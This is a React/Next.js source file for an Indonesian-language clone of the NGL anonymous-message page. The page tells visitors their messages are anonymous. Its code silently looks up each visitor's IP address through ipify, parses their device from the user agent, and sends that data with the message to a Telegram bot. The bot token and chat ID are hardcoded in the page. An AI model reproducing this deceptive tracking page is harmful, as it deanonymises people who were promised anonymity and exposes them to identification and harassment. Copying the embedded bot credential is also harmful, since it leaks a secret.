import { useState, useEffect } from "react";
import Head from "next/head";

export default function NGLPage() {
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ip: "Tidak diketahui",
    userAgent: navigator.userAgent,
    device: "Tidak diketahui",
  });

  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const deviceInfo = parseDeviceInfo(navigator.userAgent);
        setUserInfo({
          ip: data.ip,
          userAgent: navigator.userAgent,
          device: deviceInfo,
        });
      })
      .catch((err) => {
        console.error("Error fetching IP info:", err);
      });
  }, []);

  const parseDeviceInfo = (userAgent) => {
    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Samsung|Xiaomi|Realme|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry)/i;
    const match = userAgent.match(deviceRegex);
    if (match) {
      return match[0].trim();
    }
    return "Tidak diketahui";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!message.trim()) {
      alert("Pesan tidak boleh kosong!");
      return;
    }
    setLoading(true);
    setSuccess(false);

    try {
      const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
      const chatId = "1516343905";
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Pesan anonim dari:\nIP: ${userInfo.ip}\nUSER AGENT: ${userInfo.userAgent}\nDEVICE: ${userInfo.device}\n\nPESAN: ${message}`,
          }),
        }
      );

      if (response.ok) {
        setMessage("");
        setSuccess(true);
      } else {
        alert("Gagal mengirim pesan. Coba lagi.");
      }
    } catch (error) {
      alert("Terjadi kesalahan. Coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const closePopup = () => setSuccess(false);

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>NGL - MINN</title>
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
        />
        <link rel="icon" href="/img/icon.png" />
        <style>{`
          body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            display: flex;
            flex-direction: column;
            height: 100vh;
          }
          .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background-color: #161b22;
          }
          .navbar .logo {
            display: flex;
            align-items: center;
          }
          .navbar .logo i {
            font-size: 24px;
            margin-right: 10px;
          }
          .content {
            padding: 20px;
            flex-grow: 1;
          }
          .content h1 {
            display: flex;
            align-items: center;
            font-size: 24px;
          }
          .content h1 i {
            margin-right: 10px;
          }
          .form-container {
            background-color: #161b22;
            border-radius: 10px;
            padding: 20px margin-top: 20px;
          }
          .username {
            font-size: 18px;
            font-weight: bold;
            color: #58a6ff;
          }
          .message {
            font-size: 14px;
            color: #8b949e;
          }
          .message-box {
            width: 100%;
            height: 120px;
            margin-top: 10px;
            padding: 10px;
            border: 1px solid #58a6ff;
            border-radius: 10px;
            background-color: #0d1117;
            color: #c9d1d9;
            font-size: 14px;
            resize: none;
            transition: border-color 0.3s ease;
          }
          .message-box:focus {
            border-color: #58a6ff;
            outline: none;
          }
          .send-button {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #58a6ff;
            border: none;
            border-radius: 10px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
          }
          .send-button:disabled {
            background-color: #4a94d6;
          }
          .send-button:hover {
            background-color: #4a94d6;
          }
          .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #8b949e;
            margin-top: auto;
          }
          .footer i {
            color: #ff7b72;
          }
          .popup-success {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            border-radius: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 30px;
            display: flex;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            animation: fadeIn 0.3s ease;
          }
          .popup-content i {
            font-size: 50px;
            color: #4caf50;
          }
          .popup-content p {
            margin: 10px 0;
            font-size: 16px;
            font-weight: bold;
            color: #333;
          }
          .popup-close {
            background: #4caf50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 15px;
          }
          .popup-close:hover {
            background: #45a047;
          }
          @keyframes fadeIn {
            from {
              opacity: 0;
              transform: translate(-50%, -60%);
            }
            to {
              opacity: 1;
              transform: translate(-50%, -50%);
            }
          }
        `}</style>
      </Head>
      <body>
        <div className="navbar">
          <div className="logo">
            <i className="fas fa-angle-double-right"></i>
            <span>MINN</span>
          </div>
          <div className="icons">
            <i className="fas fa-user-circle"></i>
          </div>
        </div>
        <div className="content">
          <h1>
            <i className="fas fa-user-circle"></i> NGL - MIN
          </h1>
          <div className="form-container">
            <form onSubmit={handleSubmit}>
              <div>
                <div className="username">@minn</div>
                <div className="message">kirimi aku pesan anonim!</div>
              </div>
              <textarea
                className="message-box"
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                placeholder="Kirim pesan anonim padaku..."
                disabled={loading}
              ></textarea>
              <div className="info">
                <i className="fas fa-lock lock-icon"></i> tanya-jawab anonim
              </div>
              <button type="submit" className="send-button" disabled={loading}>
                {loading ? "Mengirim..." : "Kirim !"}
              </button>
            </form>
          </div>
          {success && (
            <div className="popup-success">
              <div className="popup-content">
                <i className="fas fa-check-circle"></i>
                <p>Pesan berhasil dikirim!</p>
                <button className="popup-close" onClick={closePopup}>
                  OK
                </button>
              </div>
            </div>
          )}
          {error && (
            <div className="popup-success">
              <div className="popup-content">
                <i className="fas fa-times-circle" style={{ color: "red" }}></i>
                <p>Pesan gagal dikirim. Coba lagi.</p>
                <button className="popup-close" onClick={closePopup}>
                  OK
                </button>
              </div>
            </div>
          )}
        </div>
        <div className="footer">
          Made with <i className="fas fa-heart"></i> by Minn.
        </div>
      </body>
    </>
  );
}